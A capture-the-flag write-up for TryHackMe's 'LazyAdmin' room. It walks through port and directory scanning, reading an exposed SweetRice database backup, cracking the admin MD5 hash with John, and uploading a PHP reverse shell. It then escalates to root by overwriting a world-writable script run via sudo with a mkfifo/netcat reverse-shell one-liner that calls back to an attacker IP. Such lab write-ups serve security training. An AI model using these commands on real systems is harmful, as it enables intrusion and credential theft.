# TryHackMe CTF

> This write-up has been reformatted using AI from my original notes for clarity and better viewing

## Machine Information

| Field            | Details    |
| ---------------- | ---------- |
| **Machine Name** | LazyAdmin  |
| **Date**         | 2/23/2026  |
| **Completed**    | 2/23/2026  |
| **Attacker OS**  | Kali Linux |
| **Difficulty**   | Easy       |

---

## Room Questions

### Task 1: LazyAdmin

| Question   | Answer                                                                              |
| ---------- | ----------------------------------------------------------------------------------- |
| User Flag? | <details><summary>Reveal</summary>`THM{63e5bce9271952aad1113b6f1ac28a07}`</details> |
| Root Flag? | <details><summary>Reveal</summary>`THM{6637f41d0177b6f37cb20d775124699f}`</details> |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -vv 10.66.183.145
```

### Nmap Output

```bash
Nmap scan report for 10.66.183.145
Host is up, received echo-reply ttl 62 (0.018s latency).
Scanned at 2026-02-23 11:38:57 EST for 145s
Not shown: 65010 closed tcp ports (reset), 523 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.18 seconds
Raw packets sent: 66689 (2.934MB) | Rcvd: 65013 (2.601MB)
```

### Scan Summary

**Scan Date:** 2026-02-23 at 11:38:57 EST | **Duration:** 146 seconds | **Host Status:** Up (latency: 0.018s, TTL: 62)

#### Open Ports

| Port   | State | Service | Version                         |
| ------ | ----- | ------- | ------------------------------- |
| 22/tcp | Open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | Open  | HTTP    | Apache httpd 2.4.18 (Ubuntu)    |

> 65,010 closed TCP ports not shown (reset) | 523 filtered ports not shown (no-response)

#### Port 22 — SSH

**Service:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| Key Type | Bits | Fingerprint                                       |
| -------- | ---- | ------------------------------------------------- |
| RSA      | 2048 | `49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0` |
| ECDSA    | 256  | `2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55` |
| ED25519  | 256  | `61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e` |

#### Port 80 — HTTP

**Service:** Apache httpd 2.4.18 (Ubuntu) | **Page Title:** Apache2 Ubuntu Default Page | **Server Header:** `Apache/2.4.18 (Ubuntu)`

Supported Methods: `GET` `HEAD` `POST` `OPTIONS`

**Notes:**

- Port 80 is serving the **Apache2 Ubuntu Default Page** — the web server is likely unconfigured or the real content is hosted at a subdirectory/subdomain.
- SSH (OpenSSH 7.2p2) is an older version with known vulnerabilities — worth checking against CVE databases.

---

### Web Enumeration

```bash
gobuster dir -u http://10.66.183.145 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50 -o gobuster.txt
```

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.183.145
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
content              (Status: 301) [Size: 316] [--> http://10.66.183.145/content/]
index.html           (Status: 200) [Size: 11321]
server-status        (Status: 403) [Size: 278]

===============================================================
Finished
===============================================================
```

### Directory Analysis

- **`/index.php`** — Apache page, nothing of value
- **`/content`** — This directory points to a misconfigured CMS system

![content](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin1.png)

```HTML

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0" name="viewport" id="viewport"/><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><title>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</title>
<title>SweetRice notice</title>
<script type="text/javascript" src="http://10.66.183.145/content/js/SweetRice.js"></script>
<style>
*{margin:0;}
body{font-family:"Microsoft YaHei",Verdana,Georgia,arial,sans-serif;}
.header{line-height:30px;font-size:20px;background-color:#444;box-shadow:0px 0px 2px 2px #444;color:#fafafa;padding:0px 10px;}
#div_foot{	background-color:#444;height:30px;	line-height:30px;	color:#fff;padding:0px 10px;}
#div_foot a{	color: #66CC00;	text-decoration: none;}
#div_foot a:hover{	color: #66CC00;	text-decoration: underline;}
.content{margin:0px 10px;}
.content h1{
	margin:20px 0px;
	font-size:22px;
}
.content div,.content p{margin-bottom:16px;}
</style>
</head>
<body>
<div class="header">SweetRice notice</div>
<div class="content">
<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox "Site close" to open your website.</p><p>More help at <a href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/">Tip for Basic CMS SweetRice installed</a></p></div>
<div id="div_foot">Powered by <a href="http://www.basic-cms.org">Basic-CMS.ORG</a> SweetRice.</div>
<script type="text/javascript">
<!--
	_().ready(function(){
		_('.content').css({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
	});
	_(window).bind('resize',function(){
		_('.content').animate({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
	});
//-->
</script>
</body>
</html>
```

The source code also leads us to `http://10.66.183.145/content/js/SweetRice.js`

Let's also check out that directory

`http://10.66.183.145/content/js/`

![js directory](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin2.png)

These appear to just be front end JS scripts.

I am curious if there is anymore directorys beyond `/content` So we are going to run another gobuster scan on this while i research sweet rice

`gobuster dir -u http://10.66.183.145/content/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 30 2>/dev/null`

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.183.145/content/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
js                   (Status: 301) [Size: 319] [--> http://10.66.183.145/content/js/]
inc                  (Status: 301) [Size: 320] [--> http://10.66.183.145/content/inc/]
index.php            (Status: 200) [Size: 2199]
images               (Status: 301) [Size: 323] [--> http://10.66.183.145/content/images/]
_themes              (Status: 301) [Size: 324] [--> http://10.66.183.145/content/_themes/]
attachment           (Status: 301) [Size: 327] [--> http://10.66.183.145/content/attachment/]
license.txt          (Status: 200) [Size: 15410]
as                   (Status: 301) [Size: 319] [--> http://10.66.183.145/content/as/]
changelog.txt        (Status: 200) [Size: 18013]

===============================================================
Finished
===============================================================
```

### Gobuster Results — `/content/` (SweetRice CMS)

| Path            | Status | Priority | Notes                                                           |
| --------------- | ------ | -------- | --------------------------------------------------------------- |
| `as/`           | 301    | High     | SweetRice admin panel login — try default creds here            |
| `inc/`          | 301    | High     | Includes directory                                              |
| `attachment/`   | 301    | High     | User uploaded files — may contain shells or sensitive files     |
| `index.php`     | 200    | Medium   | CMS front page                                                  |
| `_themes/`      | 301    | Medium   | Theme files — sometimes writable and abusable for file upload   |
| `images/`       | 301    | Medium   | Image uploads including php files - multiple file types allowed |
| `js/`           | 301    | Low      | Frontend JavaScript                                             |
| `license.txt`   | 200    | Low      | Contains software license                                       |
| `changelog.txt` | 200    | Low      | Version history — useful for finding known CVEs                 |

### Recommended Next Steps

1. Check `license.txt` and `changelog.txt` to pin down the exact SweetRice version and search for CVEs
2. Hit `/content/inc/` and look for aql stuff
3. Navigate to `/content/as/` for the admin login panel

After doing some research on sweetrice this is what I was able to find!

`License.txt` reveals the following:

```plaintext
SweetRice - Simple Website Management System
Version 1.5.0
```

### SweetRice 1.5.1 — Known Vulnerabilities

| EDB ID    | Type                       | Severity | Description                                                                                         |
| --------- | -------------------------- | -------- | --------------------------------------------------------------------------------------------------- |
| 40700     | CSRF / PHP Code Execution  | Critical | CSRF in the Ads section allows an attacker to inject and execute arbitrary PHP code via `/inc/ads/` |
| 40716     | Arbitrary File Upload      | Critical | Authenticated file upload with no extension restriction — direct shell upload path                  |
| 40717     | Local File Inclusion (LFI) | High     | LFI via the media management panel, requires authentication                                         |
| 40718     | Backup Disclosure          | High     | MySQL backups publicly accessible at `/content/inc/mysql_backup/` — no auth required                |
| NS-17-005 | Blind SQL Injection        | Critical | SQLi via `sys_name` POST parameter at `/as/?type=post&mode=insert`                                  |

`http://10.66.183.145/content/inc/mysql_backup/`

This directory contains a sql file!

`mysql_bakup_20191129023059-1.5.1.sql`

This is where we can get some credentials to see if we can get access.

We can run grep to see if we can get anything from the sql file we downloaded!

```bash
saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >ls
mysql_bakup_20191129023059-1.5.1.sql  sitemap.xsl
saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >grep -i "admin" mysql_bakup_20191129023059-1.5.1.sql
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

```

### Extracted Credentials from SQL Backup

| Field     | Value                              |
| --------- | ---------------------------------- |
| Username  | `manager`                          |
| Password  | `42f749ade7f9e195bf475f37a44cafcb` |
| Hash Type | MD5 (32 chars)                     |
| Site Name | Lazy Admin's Website               |

Time to put john to work!

```bash
saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /home/saintmichael/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)
1g 0:00:00:00 DONE (2026-02-23 12:58) 50.00g/s 1689Kp/s 1689Kc/s 1689KC/s 062089..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

So we now have the following creds!

| Field    | Value         |
| -------- | ------------- |
| Username | `manager`     |
| Password | `Password123` |

![login](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin3.png)

time to explore.

---

## 2. Accessing the admin panel

![thebackend](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin4.png)

Let's see if we can get a reverse shell?

We can try using the good old [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

> Be sure to check your UFW rules and update the config to match your attackbox ip address

![uploadingrevshell](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin5.png)

![triggershell](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/lazyadmin6.png)

and we have a shell

```bash
saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >nc -nlvp 4242
listening on [any] 4242 ...
connect to [192.168.133.88] from (UNKNOWN) [10.66.183.145] 60402
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 21:11:39 up  2:33,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
$
```

Now we need to escalate our privs to root!

```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$
```

It appears that we can get a root reverse shell in this box because we have the permissions to sudo this script

```bash
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.133.88 5555 >/tmp/f' > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl



saintmichael@archangelkali~/thm/ctf/machines/lazyadmin/files >nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.133.88] from (UNKNOWN) [10.66.183.145] 49394
/bin/sh: 0: can't access tty; job control turned off
# cd root
/bin/sh: 1: cd: can't cd to root
# ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
# cat mysql_login.txt
rice:randompass
# cd ..
# ls
itguy
# cd ..
# ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
#
```

---

## Key Takeaways for Beginners

### 1. Always Start with a Port Scan

The first thing you do when attacking a machine is find out what's running on it. **Nmap** is the standard tool for this. It tells you which ports are open and what services are listening on them. In this room, we found two: SSH on port 22 and a web server on port 80. The web server became our way in.

> Think of ports like doors on a building — Nmap tells you which ones are open and what's behind them.

---

### 2. Directory Busting Finds Hidden Pages

Websites often have pages that aren't linked anywhere publicly. Tools like **Gobuster** brute-force common directory and file names to discover them. Here, we found `/content/` — the root of a SweetRice CMS installation that wasn't linked anywhere on the default Apache page. Without this step, we'd have had nothing to work with.

> If a door isn't listed, it doesn't mean it doesn't exist. Gobuster checks them all.

---

### 3. CMS Versions Leak Vulnerability Information

Once we identified SweetRice via the `/content/` directory, we checked `changelog.txt` to confirm the version (1.5.0). With a version number in hand, we could search **Exploit-DB** for known vulnerabilities. This is a core recon step — always try to fingerprint the exact version of any software you find.

> A version number is a roadmap to known weaknesses. Never skip it.

---

### 4. Misconfigured Directories Can Expose Sensitive Files

One of the SweetRice vulnerabilities (EDB-40718) revealed that MySQL backups are stored publicly at `/content/inc/mysql_backup/` with no authentication required. Inside we found a `.sql` backup file containing the admin username and a MD5 hashed password — no exploitation needed, just browsing to the right URL.

> Developers often leave backup files in places they shouldn't. Always enumerate directories thoroughly.

---

### 5. Hash Cracking Turns Hashed Passwords into Plaintext

The password in the SQL file was stored as an MD5 hash — a one-way fingerprint of the original password. Tools like **John the Ripper** work by hashing every word in a wordlist (like `rockyou.txt`) and comparing it against your target hash until it finds a match. MD5 is a weak hashing algorithm and common passwords crack almost instantly.
```bash
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

> A hash isn't a password — but a weak one might as well be.

---

### 6. File Upload Filters Can Often Be Bypassed

The SweetRice media center allowed file uploads but was intended for images. By uploading a PHP reverse shell with a `.phtml` extension, we bypassed the filter — Apache still processes `.phtml` as PHP, but the upload filter didn't block it. Always try alternate extensions when a file type appears restricted.

> Security filters that only check the filename are easy to trick. Good filters check the actual file contents too.

---

### 7. A Reverse Shell Gives You Remote Code Execution

A **reverse shell** is a script that, when executed on a target machine, connects back to your machine and gives you a command prompt. We uploaded one as a `.phtml` file, used `netcat` to listen for the connection, then triggered it by navigating to the file in the browser.
```bash
nc -nlvp 4242
```

> Instead of knocking on the target's door, you make the target call you.

---

### 8. `sudo -l` Is Always Your First Privesc Check

Once you have a shell, always run `sudo -l` to see what the current user can run with elevated privileges. Here, `www-data` could run a specific Perl script as root with no password. That script called `/etc/copy.sh` — and that file was world-writable. We overwrote it with our own reverse shell and triggered it via sudo to get a root shell.

> `sudo -l` is the first thing you run after getting a shell. It's free information about your path to root.

---

### 9. What is Perl?

**Perl** is a general-purpose scripting language that's been around since the 1980s. It's commonly found on older Linux systems and is often used for system administration scripts. In this room, `backup.pl` was a simple Perl script that called a shell command using `system()`:
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The `system()` function tells Perl to run an external shell command — in thiSs case, execute `/etc/copy.sh` as a shell script. Because we could run this script as root via sudo, and because the shell script it called was writable by us, we were able to control what ran as root.

> Perl itself wasn't the vulnerability here — the misconfigured sudo permission and writable shell script were. Perl was just the delivery mechanism.

---

### Tools Used in This Room

| Tool              | Purpose                                          |
| ----------------- | ------------------------------------------------ |
| `nmap`            | Port scanning and service detection              |
| `gobuster`        | Web directory and file enumeration               |
| `john`            | Hash cracking                                    |
| `netcat (nc)`     | Listening for reverse shell connections          |
| `grep`            | Extracting credentials from SQL files            |
| PHP reverse shell | Remote code execution payload                    |
| Exploit-DB        | Research known CVEs for identified software      |

---

> This write-up was created by `saintmichael`
